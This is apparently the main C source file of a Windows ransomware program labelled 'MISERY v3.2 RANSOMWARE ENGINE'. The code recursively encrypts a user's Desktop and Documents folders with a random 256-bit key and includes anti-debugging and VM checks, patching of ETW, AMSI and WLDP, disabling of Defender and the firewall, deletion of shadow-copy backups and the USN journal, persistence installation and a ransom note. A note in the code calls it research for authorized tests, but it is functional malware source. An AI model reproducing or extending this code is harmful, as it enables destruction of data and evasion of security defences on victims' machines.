#include "misery_config.h"
#include "crypto.h"
#include "fileops.h"
#include "defense.h"
#include "security.h"
#include "persistence.h"
#include "utils.h"
#include "ransomnote.h"
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdbool.h>
#include <windows.h>
#include <time.h>
#include <shlobj.h>

#define KEYFILE "misery.key"
#define MAX_TARGETS 100
#define ENCRYPTION_TIMEOUT_MS 300000

/* Target directories for encryption/decryption.
   IMPORTANT: misery.key is saved OUTSIDE these directories. */
const char *g_target_dirs[] = {
    "C:\\Users\\jahan\\OneDrive\\Desktop",
    "C:\\Users\\jahan\\Documents",
    NULL
};

/* ===================================================================
 * FIX: Generate 32 cryptographically random bytes using CryptoAPI.
 * This is a true 256-bit key, not a 119-bit alphanumeric password.
 * =================================================================== */
static void GenerateRawKey(BYTE *key, DWORD keySize) {
    HCRYPTPROV hProv = 0;
    if (CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        CryptGenRandom(hProv, keySize, key);
        CryptReleaseContext(hProv, 0);
        return;
    }
    /* Extreme fallback — should never reach here on Windows */
    HCRYPTPROV hProv2 = 0;
    CryptAcquireContextA(&hProv2, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptGenRandom(hProv2, keySize, key);
    CryptReleaseContext(hProv2, 0);
}

/* ===================================================================
 * FIX: Save key file in clean hex format to a location OUTSIDE all
 * target directories. The file is human-readable and won't be
 * matched by the file traversal (saved outside target dirs).
 *
 * Format:
 *   <32 hex chars for salt>
 *   <64 hex chars for key>
 * =================================================================== */
static bool SaveKeyFile(const BYTE *rawKey, DWORD keyLen, const BYTE *salt) {
    int savedCount = 0;
    char saltHex[33], keyHex[65];
    bytes_to_hex(salt, SALT_SIZE, saltHex);
    bytes_to_hex(rawKey, keyLen, keyHex);

    /* Location 1: %TEMP% — guaranteed outside all target dirs */
    char tempPath[MAX_PATH];
    if (GetTempPathA(MAX_PATH, tempPath)) {
        char keyPath[MAX_PATH * 2];
        snprintf(keyPath, sizeof(keyPath), "%s\\misery.key", tempPath);
        FILE *kf = fopen(keyPath, "w");
        if (kf) {
            fprintf(kf, "%s\n%s\n", saltHex, keyHex);
            fclose(kf);
            MiseryLog(MISERY_LOG_INFO, "Key saved to: %s", keyPath);
            savedCount++;
        }
    }

    /* Location 2: Desktop (user-visible, but we skip it in fileops) */
    char desktop[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop) == S_OK) {
        char keyPath[MAX_PATH * 2];
        snprintf(keyPath, sizeof(keyPath), "%s\\misery.key", desktop);
        FILE *kf = fopen(keyPath, "w");
        if (kf) {
            fprintf(kf, "%s\n%s\n", saltHex, keyHex);
            fclose(kf);
            MiseryLog(MISERY_LOG_INFO, "Key saved to: %s", keyPath);
            savedCount++;
        }
    }

    /* Location 3: CWD — with IsKeyFilePath exclusion in fileops */
    char cwd[MAX_PATH];
    if (GetCurrentDirectoryA(MAX_PATH, cwd)) {
        /* Skip if CWD is same as Desktop or TEMP (avoid duplicate) */
        bool dup = (strcmp(cwd, desktop) == 0);
        if (!dup) {
            char tmpCheck[MAX_PATH];
            if (GetTempPathA(MAX_PATH, tmpCheck))
                dup = (strcmp(cwd, tmpCheck) == 0);
        }
        if (!dup) {
            char keyPath[MAX_PATH * 2];
            snprintf(keyPath, sizeof(keyPath), "%s\\misery.key", cwd);
            FILE *kf = fopen(keyPath, "w");
            if (kf) {
                fprintf(kf, "%s\n%s\n", saltHex, keyHex);
                fclose(kf);
                MiseryLog(MISERY_LOG_INFO, "Key saved to: %s", keyPath);
                savedCount++;
            }
        }
    }

    return savedCount > 0;
}

/* ===================================================================
 * FIX: Open misery.key from any known location.
 * Returns handle opened in text mode ("r") for hex parsing.
 * =================================================================== */
static FILE *OpenKeyFile(char *outPath, size_t outPathSize) {
    char tempPath[MAX_PATH];
    if (GetTempPathA(MAX_PATH, tempPath)) {
        snprintf(outPath, outPathSize, "%s\\misery.key", tempPath);
        FILE *kf = fopen(outPath, "r");
        if (kf) return kf;
    }

    char desktop[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop) == S_OK) {
        snprintf(outPath, outPathSize, "%s\\misery.key", desktop);
        FILE *kf = fopen(outPath, "r");
        if (kf) return kf;
    }

    snprintf(outPath, outPathSize, "misery.key");
    FILE *kf = fopen(outPath, "r");
    if (kf) return kf;

    return NULL;
}

/* ===================================================================
 * STEP 6: Recursive helper for finding .encrypted files
 * Searches all subdirectories recursively until first .encrypted found
 * =================================================================== */
static bool FindEncryptedFileRecursive(const WCHAR *root, BYTE *outSalt,
                                        char *outPath, size_t outPathSize) {
    WCHAR searchPath[FILEOPS_MAX_PATH];
    _snwprintf(searchPath, FILEOPS_MAX_PATH - 1, L"%s\\*", root);

    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileExW(searchPath, FindExInfoStandard, &fd,
                                     FindExSearchNameMatch, NULL, 0);
    if (hFind == INVALID_HANDLE_VALUE) return false;

    do {
        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0)
            continue;

        WCHAR fullPath[FILEOPS_MAX_PATH];
        _snwprintf(fullPath, FILEOPS_MAX_PATH - 1, L"%s\\%s", root, fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            /* Recurse into subdirectory */
            if (FindEncryptedFileRecursive(fullPath, outSalt, outPath, outPathSize)) {
                FindClose(hFind);
                return true;
            }
        } else {
            /* Check if this file ends with .encrypted */
            size_t len = wcslen(fullPath);
            if (len >= 11 && _wcsicmp(fullPath + len - 10, L".encrypted") == 0) {
                /* Found .encrypted file; read salt */
                HANDLE hFile = CreateFileW(fullPath, GENERIC_READ,
                    FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
                if (hFile != INVALID_HANDLE_VALUE) {
                    DWORD rb = 0;
                    if (ReadFile(hFile, outSalt, SALT_SIZE, &rb, NULL) && rb == SALT_SIZE) {
                        WideCharToMultiByte(CP_UTF8, 0, fullPath, -1,
                            outPath, (int)outPathSize, NULL, NULL);
                        CloseHandle(hFile);
                        FindClose(hFind);
                        return true;
                    }
                    CloseHandle(hFile);
                }
            }
        }
    } while (FindNextFileW(hFind, &fd) != 0);

    FindClose(hFind);
    return false;
}

/* ===================================================================
 * STEP 6: Simplified FindFirstEncryptedFileAndSalt using recursive helper
 * Searches all target directories and their subdirectories at any depth
 * =================================================================== */
static bool FindFirstEncryptedFileAndSalt(BYTE *outSalt, char *outPath,
                                           size_t outPathSize) {
    for (int i = 0; g_target_dirs[i]; i++) {
        WCHAR wideRoot[FILEOPS_MAX_PATH];
        MultiByteToWideChar(CP_UTF8, 0, g_target_dirs[i], -1,
                            wideRoot, FILEOPS_MAX_PATH);
        if (FindEncryptedFileRecursive(wideRoot, outSalt, outPath, outPathSize))
            return true;
    }
    return false;
}

/* ===================================================================
 * FIX: Fully rewritten decryption engine.
 *
 * Flow:
 *   1. Parse hex key string to 32 raw bytes
 *   2. Find first .encrypted file recursively, extract salt
 *   3. Initialize crypto with key + extracted salt
 *   4. Test-decrypt one file — if HMAC fails, key is WRONG → return false
 *   5. Run full FileOps decrypt on all target directories
 * =================================================================== */
bool MiseryRunDecrypt(const char *keyHex, FILEOPS_STATS *outStats) {
    if (!keyHex || !*keyHex) {
        MiseryLog(MISERY_LOG_ERROR, "Decrypt: No key provided");
        return false;
    }

    MiseryLog(MISERY_LOG_INFO, "Decrypt: Starting with provided key");

    /* Parse hex key: must be 64 hex characters (32 bytes) */
    size_t hexLen = strlen(keyHex);
    /* Trim trailing whitespace */
    while (hexLen > 0 && (keyHex[hexLen - 1] == '\r' ||
                          keyHex[hexLen - 1] == '\n' ||
                          keyHex[hexLen - 1] == ' '))
        hexLen--;

    if (hexLen != (size_t)RAW_KEY_SIZE * 2) {
        MiseryLog(MISERY_LOG_ERROR,
                  "Decrypt: Key must be %d hex chars (got %zu)",
                  RAW_KEY_SIZE * 2, hexLen);
        return false;
    }

    BYTE rawKey[RAW_KEY_SIZE];
    if (!hex_to_bytes(keyHex, hexLen, rawKey, sizeof(rawKey))) {
        MiseryLog(MISERY_LOG_ERROR, "Decrypt: Failed to parse hex key (hex_to_bytes)");
        return false;
    }

    /* Find first encrypted file and extract salt */
    BYTE salt[SALT_SIZE] = {0};
    char testEncPath[FILEOPS_MAX_PATH] = {0};

    if (!FindFirstEncryptedFileAndSalt(salt, testEncPath, sizeof(testEncPath))) {
        MiseryLog(MISERY_LOG_WARN, "Decrypt: No .encrypted files found");
        if (outStats) {
            outStats->filesSucceeded = 0;
            outStats->filesFailed = 0;
            outStats->bytesProcessed = 0;
        }
        return true; /* Nothing to do is not a failure */
    }

    MiseryLog(MISERY_LOG_INFO, "Decrypt: Found test file: %s", testEncPath);

    /* Initialize crypto with key + extracted salt */
    CleanupCrypto();
    CRYPTO_ERROR cerr = InitCryptoRaw(rawKey, RAW_KEY_SIZE, salt);
    if (cerr != CRYPTO_SUCCESS) {
        MiseryLog(MISERY_LOG_ERROR, "Decrypt: InitCryptoRaw failed: %s",
                  GetErrorString(cerr));
        return false;
    }

    /* STEP 7: Diagnostic logging after successful crypto init */
    {
        BYTE *ctx_salt = GetCryptoCtx()->salt;
        char saltDbg[33];
        bytes_to_hex(ctx_salt, SALT_SIZE, saltDbg);
        MiseryLog(MISERY_LOG_INFO, "Decrypt: Using salt=%s from file: %s",
                  saltDbg, testEncPath);
        
        /* Also log the extracted salt from the encrypted file for comparison */
        char extractedSalt[33];
        bytes_to_hex(salt, SALT_SIZE, extractedSalt);
        MiseryLog(MISERY_LOG_INFO, "Decrypt: Extracted salt from file=%s (match: %s)",
                  extractedSalt, (strcmp(saltDbg, extractedSalt) == 0) ? "YES" : "NO");
        
        /* Note: Deriving a hash from the AES key requires additional crypto operations.
           For now, the salt match and successful test-decrypt below serve as verification. */
    }

    /* FIX: Verify key by test-decrypting one file.
     * If HMAC doesn't match, the key is WRONG — return false immediately. */
    HANDLE hTest = CreateFileA(testEncPath, GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hTest == INVALID_HANDLE_VALUE) {
        MiseryLog(MISERY_LOG_WARN, "Decrypt: Cannot open test file: %s", testEncPath);
    } else {
        DWORD fs = GetFileSize(hTest, NULL);
        if (fs == INVALID_FILE_SIZE || fs == 0 || fs > 10 * 1024 * 1024) {
            MiseryLog(MISERY_LOG_WARN, "Decrypt: Test file size invalid (%lu), skipping", fs);
            CloseHandle(hTest);
        } else {
            BYTE *testBuf = (BYTE*)VirtualAlloc(NULL, fs, MEM_COMMIT, PAGE_READWRITE);
            BYTE *testOut = (BYTE*)VirtualAlloc(NULL, fs, MEM_COMMIT, PAGE_READWRITE);

            if (testBuf && testOut) {
                DWORD rd = 0;
                if (ReadFile(hTest, testBuf, fs, &rd, NULL) && rd == fs) {
                    DWORD outLen = 0;
                    cerr = DecryptBuffer(GetCryptoCtx(), testBuf, fs,
                                         testOut, &outLen, fs);
                    if (cerr != CRYPTO_SUCCESS) {
                        MiseryLog(MISERY_LOG_ERROR,
                                  "Decrypt: Test-decrypt FAILED: %s — WRONG KEY!",
                                  GetErrorString(cerr));
                        VirtualFree(testBuf, 0, MEM_RELEASE);
                        VirtualFree(testOut, 0, MEM_RELEASE);
                        CloseHandle(hTest);
                        CleanupCrypto();
                        return false; /* Key is wrong */
                    }
                    MiseryLog(MISERY_LOG_INFO,
                              "Decrypt: Key verified (test file decrypted %lu bytes)",
                              outLen);
                }
            }
            if (testBuf) VirtualFree(testBuf, 0, MEM_RELEASE);
            if (testOut) VirtualFree(testOut, 0, MEM_RELEASE);
        }
        CloseHandle(hTest);
    }

    /* Key is valid — run full decryption */
    FILEOPS_CONFIG cfg = {0};
    cfg.threadCount   = 8;
    cfg.ioBufferSize  = (64 * 1024);
    cfg.flags         = FILEOPS_FLAG_RECURSIVE;
    cfg.pfnShouldSkip = FileOps_DefaultShouldSkip;
    cfg.crypto_ctx    = GetCryptoCtx();
    cfg.decryptMode   = true;

    FILEOPS_CTX *fctx = FileOps_CreateContext(&cfg);
    if (!fctx) {
        MiseryLog(MISERY_LOG_ERROR, "Decrypt: Failed to create FileOps context");
        return false;
    }

    for (int i = 0; g_target_dirs[i]; i++) {
        WCHAR widePath[FILEOPS_MAX_PATH];
        MultiByteToWideChar(CP_UTF8, 0, g_target_dirs[i], -1,
                            widePath, FILEOPS_MAX_PATH);
        MiseryLog(MISERY_LOG_INFO, "Decrypt: Queuing directory: %s",
                  g_target_dirs[i]);
        FileOps_TraverseAndQueue(fctx, widePath);
    }

    MiseryLog(MISERY_LOG_INFO, "Decrypt: Waiting for decryption to complete...");
    FileOps_WaitForCompletion(fctx);

    if (outStats) FileOps_GetStats(fctx, outStats);

    FILEOPS_STATS stats;
    FileOps_GetStats(fctx, &stats);
    MiseryLog(MISERY_LOG_INFO,
              "Decrypt: Complete — %lld OK, %lld failed, %lld bytes",
              stats.filesSucceeded, stats.filesFailed, stats.bytesProcessed);

    FileOps_DestroyContext(fctx);
    return true;
}

/* ===================================================================
 * PHASE EXECUTIONS (unchanged from original, using Updated crypto)
 * =================================================================== */

static bool ExecutePhaseAntiAnalysis(void) {
    MiseryLog(MISERY_LOG_INFO, "Starting ANTI-ANALYSIS phase...");
    bool success = true;
    if (DefenseCheckDebugger()) {
        MiseryLog(MISERY_LOG_WARN, "Debugger detected! Aborting.");
        return false;
    }
    if (DefenseDetectAnalysisTools()) {
        MiseryLog(MISERY_LOG_WARN, "Analysis tools detected!");
        success = false;
    }
    if (DefenseDetectVirtualMachine()) {
        MiseryLog(MISERY_LOG_WARN, "VM detected!");
        success = false;
    }
    return MiseryPhaseTransition(PHASE_ANTI_ANALYSIS, success);
}

static bool ExecutePhaseDefensePatching(void) {
    MiseryLog(MISERY_LOG_INFO, "Starting DEFENSE PATCHING phase...");
    bool success = true;
    if (!DefensePatchETW())        { MiseryLog(MISERY_LOG_WARN, "ETW patch failed");  success = false; }
    if (!DefensePatchAMSI())       { MiseryLog(MISERY_LOG_WARN, "AMSI patch failed"); success = false; }
    if (!DefensePatchWLDP())       { MiseryLog(MISERY_LOG_WARN, "WLDP patch failed"); success = false; }
    DefenseHideFromDebugger();
    DefenseResetSecurityChecks();
    return MiseryPhaseTransition(PHASE_DEFENSE_DISABLE, success);
}

static bool ExecutePhaseSecurityDisable(void) {
    MiseryLog(MISERY_LOG_INFO, "Starting SECURITY DISABLE phase...");
    bool success = true;
    if (!SecurityDisableDefender())      { MiseryLog(MISERY_LOG_WARN, "Defender disable failed");  success = false; }
    if (!SecurityKillSecurityServices()) { MiseryLog(MISERY_LOG_WARN, "Svc kill failed");          success = false; }
    if (!SecurityDisableFirewall())      { MiseryLog(MISERY_LOG_WARN, "Firewall disable failed");  success = false; }
    return MiseryPhaseTransition(PHASE_DEFENSE_DISABLE, success);
}

static bool ExecutePhaseBackupDestroy(void) {
    MiseryLog(MISERY_LOG_INFO, "Starting BACKUP DESTROY phase...");
    bool success = true;
    if (!UtilsNukeBackups())     { MiseryLog(MISERY_LOG_WARN, "VSS nuke failed");  success = false; }
    if (!UtilsWipeUSNJournal())  { MiseryLog(MISERY_LOG_WARN, "USN wipe failed");  success = false; }
    return MiseryPhaseTransition(PHASE_BACKUP_DESTROY, success);
}

static bool ExecutePhaseEncryption(void) {
    MiseryLog(MISERY_LOG_INFO, "Starting ENCRYPTION phase...");
    bool success = true;

    CRYPTO_CTX *crypto_ctx = GetCryptoCtx();
    if (!crypto_ctx || !crypto_ctx->initialized) {
        MiseryLog(MISERY_LOG_ERROR, "Crypto context not initialized!");
        return MiseryPhaseTransition(PHASE_ENCRYPTION, false);
    }

    FILEOPS_CONFIG cfg = {0};
    cfg.threadCount   = 8;
    cfg.ioBufferSize  = (64 * 1024);
    cfg.flags         = FILEOPS_FLAG_RECURSIVE;
    cfg.pfnShouldSkip = FileOps_DefaultShouldSkip;
    cfg.crypto_ctx    = crypto_ctx;
    cfg.decryptMode   = false;

    FILEOPS_CTX *fctx = FileOps_CreateContext(&cfg);
    if (!fctx) {
        MiseryLog(MISERY_LOG_ERROR, "Failed to create FileOps context");
        return MiseryPhaseTransition(PHASE_ENCRYPTION, false);
    }

    for (int i = 0; g_target_dirs[i]; i++) {
        WCHAR widePath[FILEOPS_MAX_PATH];
        MultiByteToWideChar(CP_UTF8, 0, g_target_dirs[i], -1,
                            widePath, FILEOPS_MAX_PATH);
        FileOps_TraverseAndQueue(fctx, widePath);
    }

    FileOps_WaitForCompletion(fctx);

    FILEOPS_STATS stats = {0};
    FileOps_GetStats(fctx, &stats);

    MiseryLog(MISERY_LOG_INFO,
              "Encryption stats: %lld bytes, %lld succeeded, %lld failed",
              stats.bytesProcessed, stats.filesSucceeded, stats.filesFailed);

    g_misery_ctx.filesEncrypted = (DWORD)stats.filesSucceeded;
    g_misery_ctx.filesFailed    = (DWORD)stats.filesFailed;
    g_misery_ctx.bytesEncrypted = stats.bytesProcessed;

    FileOps_DestroyContext(fctx);
    return MiseryPhaseTransition(PHASE_ENCRYPTION, success);
}

static bool ExecutePhasePeristence(void) {
    MiseryLog(MISERY_LOG_INFO, "Starting PERSISTENCE phase...");
    bool success = PersistenceInstallAll();
    return MiseryPhaseTransition(PHASE_PERSISTENCE, success);
}

static bool ExecutePhaseRansomNote(void) {
    MiseryLog(MISERY_LOG_INFO, "Starting RANSOM NOTE phase...");

    /* Drop text note on desktop */
    const char *note_content =
        "========================================\n"
        "YOUR FILES HAVE BEEN ENCRYPTED\n"
        "========================================\n"
        "This is a research project demonstration.\n"
        "For authorized penetration tests only.\n"
        "========================================\n";

    char desktop_path[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop_path) == S_OK) {
        char note_path[MAX_PATH * 2];
        snprintf(note_path, sizeof(note_path), "%s\\README.txt", desktop_path);
        UtilsDropRansomNote(note_path, note_content);
    }

    /* Show GUI window — BLOCKING */
    ShowRansomNoteWindow();

    return MiseryPhaseTransition(PHASE_RANSOM_NOTE, true);
}

static bool ExecutePhaseCleanup(void) {
    MiseryLog(MISERY_LOG_INFO, "Starting CLEANUP phase...");
    CleanupCrypto();
    return MiseryPhaseTransition(PHASE_CLEANUP, true);
}

/* ===================================================================
 * MAIN
 * =================================================================== */
int main(int argc, char **argv) {
    DWORD start_time = GetTickCount();

    if (!MiseryInitContext()) {
        puts("[!] Failed to initialize context");
        return 1;
    }

    puts("========== MISERY v3.2 RANSOMWARE ENGINE ==========");
    MiseryLog(MISERY_LOG_INFO, "=== MISERY INITIALIZATION ===");

    bool decryptmode = (argc > 1 && strcmp(argv[1], "-d") == 0);

    if (decryptmode) {
        /* ============================================================
         * FIX: DECRYPT MODE — parse hex key file
         * ============================================================ */
        MiseryLog(MISERY_LOG_INFO, "Mode: COMMAND-LINE DECRYPT");

        char keyfilePath[MAX_PATH * 2] = {0};
        FILE *kf = OpenKeyFile(keyfilePath, sizeof(keyfilePath));
        if (!kf) {
            MiseryLog(MISERY_LOG_ERROR, "Missing misery.key! Cannot decrypt.");
            MiseryCleanupContext();
            return 1;
        }

        char saltHex[33] = {0};
        char keyHex[65]  = {0};
        if (!fgets(saltHex, sizeof(saltHex), kf)) {
            MiseryLog(MISERY_LOG_ERROR, "Failed to read salt from %s", keyfilePath);
            fclose(kf); MiseryCleanupContext(); return 1;
        }
        saltHex[strcspn(saltHex, "\r\n")] = '\0';

        if (!fgets(keyHex, sizeof(keyHex), kf)) {
            MiseryLog(MISERY_LOG_ERROR, "Failed to read key from %s", keyfilePath);
            fclose(kf); MiseryCleanupContext(); return 1;
        }
        keyHex[strcspn(keyHex, "\r\n")] = '\0';
        fclose(kf);

        MiseryLog(MISERY_LOG_INFO, "Decrypt: Loaded from %s (salt=%s key=%s...)",
                  keyfilePath, saltHex,
                  (strlen(keyHex) > 8) ? (char[]){keyHex[0],keyHex[1],keyHex[2],
                  keyHex[3],keyHex[4],keyHex[5],keyHex[6],keyHex[7],'.','.','.',0}
                  : "???");

        /* Convert hex to raw bytes */
        BYTE salt[SALT_SIZE] = {0};
        if (!hex_to_bytes(saltHex, strlen(saltHex), salt, sizeof(salt))) {
            MiseryLog(MISERY_LOG_ERROR, "Decrypt: Failed to parse salt hex");
            return 1;
        }

        BYTE rawKey[RAW_KEY_SIZE];
        if (!hex_to_bytes(keyHex, strlen(keyHex), rawKey, sizeof(rawKey))) {
            MiseryLog(MISERY_LOG_ERROR, "Decrypt: Failed to parse key hex");
            SecureZeroMemory(rawKey, sizeof(rawKey));
            return 1;
        }

        CleanupCrypto();
        CRYPTO_ERROR cerr = InitCryptoRaw(rawKey, RAW_KEY_SIZE, salt);
        SecureZeroMemory(rawKey, sizeof(rawKey));
        if (cerr != CRYPTO_SUCCESS) {
            MiseryLog(MISERY_LOG_ERROR, "InitCryptoRaw failed: %s", GetErrorString(cerr));
            MiseryCleanupContext();
            return 1;
        }

        FILEOPS_STATS stats = {0};
        if (MiseryRunDecrypt(keyHex, &stats)) {
            MiseryLog(MISERY_LOG_INFO,
                      "Decrypt: %lld files decrypted, %lld failed",
                      stats.filesSucceeded, stats.filesFailed);
        } else {
            MiseryLog(MISERY_LOG_ERROR, "Decrypt: Failed — wrong key or corrupt data");
        }

        CleanupCrypto();
        MiseryCleanupContext();
        printf("[+] Done\n");
        return 0;
    }

    /* ================================================================
     * ENCRYPT MODE
     * ================================================================ */
    MiseryLog(MISERY_LOG_INFO, "Mode: ENCRYPT");

    /* Generate 32 cryptographically secure random bytes */
    BYTE rawKey[RAW_KEY_SIZE] = {0};
    GenerateRawKey(rawKey, RAW_KEY_SIZE);

    /* Log first 8 hex chars for debugging */
    char preview[17];
    for (int i = 0; i < 8; i++) sprintf(preview + i * 2, "%02x", rawKey[i]);
    preview[16] = '\0';
    MiseryLog(MISERY_LOG_INFO, "Generated raw key: %s...", preview);

    /* Initialize crypto with raw key and random salt */
    CleanupCrypto();
    CRYPTO_ERROR cerr = InitCryptoRaw(rawKey, RAW_KEY_SIZE, NULL);
    if (cerr != CRYPTO_SUCCESS) {
        MiseryLog(MISERY_LOG_ERROR, "InitCryptoRaw failed: %s", GetErrorString(cerr));
        SecureZeroMemory(rawKey, sizeof(rawKey));
        MiseryCleanupContext();
        return 1;
    }

    /* Save key file (hex format) */
    if (!SaveKeyFile(rawKey, RAW_KEY_SIZE, GetCryptoCtx()->salt)) {
        MiseryLog(MISERY_LOG_ERROR, "CRITICAL: Failed to save key to ANY location!");
    } else {
        MiseryLog(MISERY_LOG_INFO, "Key file saved successfully.");
    }
    SecureZeroMemory(rawKey, sizeof(rawKey));

    /* Execute phases */
    if (!ExecutePhaseAntiAnalysis())
        MiseryLog(MISERY_LOG_WARN, "Anti-analysis failed, continuing...");

    ExecutePhaseDefensePatching();
    ExecutePhaseSecurityDisable();
    ExecutePhaseBackupDestroy();

    if (!ExecutePhaseEncryption()) {
        MiseryLog(MISERY_LOG_ERROR, "Encryption phase failed!");
        MiseryCleanupContext();
        return 1;
    }

    ExecutePhasePeristence();
    ExecutePhaseRansomNote();
    ExecutePhaseCleanup();

    g_misery_ctx.executionTimeMs = GetTickCount() - start_time;

    MiseryLog(MISERY_LOG_INFO, "=== EXECUTION COMPLETE ===");
    MiseryReportStats();
    MiseryCleanupContext();

    MiseryLog(MISERY_LOG_INFO, "Total time: %lu ms", g_misery_ctx.executionTimeMs);
    puts("[+] Done");
    return 0;
}